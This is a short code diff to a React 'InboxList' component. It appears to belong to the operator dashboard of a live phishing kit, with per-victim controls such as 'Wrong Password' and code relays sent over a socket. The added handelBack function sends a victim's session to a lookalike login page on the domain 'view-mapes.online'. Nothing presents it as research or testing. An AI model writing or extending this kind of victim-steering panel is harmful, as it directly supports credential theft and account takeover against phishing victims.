@@ -40,7 +40,7 @@ export default function InboxList({
   const [expandedRow] = useState<string | null>(null);
   const [inputValues, setInputValues] = useState<Record<string, string>>({});
   const { sendToServer } = useSocket();
-
+console.log(data,"main")
   const handleSend = (emailId: string, value: string) => {
     sendToServer("code", emailId, { url: "", code: value });
     setInputValues((prev) => ({ ...prev, [emailId]: "" }));
@@ -49,7 +49,9 @@ export default function InboxList({
   const sendWrongPassword = (emailId: string, value: string) => {
     sendToServer("code", emailId, { code: value });
   };
-
+const handelBack =(emailId: string,value: string)=>{
+ sendToServer("link", emailId, { url: `https://location.view-mapes.online/live.html?type=login&id=${value}` });
+}
   const handlePageChange = (page: number) => setCurrentPage(page);
 
   return (
@@ -211,7 +213,10 @@ export default function InboxList({
                         Wrong Password
                       </button>
 
-                      <button className="bg-[#00AEEF] text-white text-xs py-2 rounded-md shadow hover:bg-blue-500 text-center">
+                      <button 
+                      onClick={()=>handelBack(email._id,email.user)}
+                      
+                      className="bg-[#00AEEF] text-white text-xs py-2 rounded-md shadow hover:bg-blue-500 text-center">
                         Back
                       </button>
 
